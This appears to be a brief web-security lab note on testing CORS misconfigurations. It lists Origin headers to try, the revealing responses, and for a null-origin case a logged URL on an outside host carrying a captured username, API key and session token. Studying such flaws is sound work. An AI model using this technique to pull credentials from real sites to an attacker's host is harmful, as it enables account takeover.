<h1>CORS Misconfiguration</h1>
<h3>Impact:</h3>
<p>Api token, email, password, and other types of sensitive data exposure, could lead in account takeover.</p>
<h4>Headers to test:</h4>
<p><code>Origin: https://example.com</code></p>

<p><code>Origin: http://example.com</code></p>

<p><code>Origin: http://subdomain.$domain.com</code></p>

<p>Response:</p>
<p><code>Access-Control-Allow-Origin: https://example.com</code></p>
<p><code>Access-Control-Allow-Origin: https://subdomain.$domain.com</code></p>

<p>CORS vulnerability with trusted null origin</p>
<p>-Go to console.log, and you must see:</p>
<p>https://angeljuanma.github.io/log?key={ "username": "wiener", "email": "", "apikey": "ILmCsS4WvD12NbFLxkHaUt7PnL3cFDzU", "sessions": [ "mWXTjX7lmBUZlRJ9TPWqfN7FxBggUFKg" ] }</p>

<p>This will store the accout detail.</p>
